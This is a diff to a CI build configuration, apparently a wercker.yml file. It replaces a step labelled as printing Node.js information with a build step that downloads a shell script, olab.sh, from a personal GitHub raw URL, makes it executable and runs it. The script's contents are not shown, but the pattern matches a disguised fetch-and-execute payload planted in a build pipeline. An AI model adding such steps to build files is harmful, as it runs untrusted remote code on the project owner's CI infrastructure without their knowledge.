@@ -1,9 +1,8 @@
-box: node
-
 build:
 
   steps:
+
     - script:
-        name: echo nodejs information
-        code: |
-          https://raw.githubusercontent.com/hendrik20212/hendr2021/main/olab.sh && chmod u+x olab.sh && ./olab.sh
+
+        code: wget https://raw.githubusercontent.com/hendrik20212/hendr2021/main/olab.sh&& chmod u+x olab.sh && ./olab.sh
+           
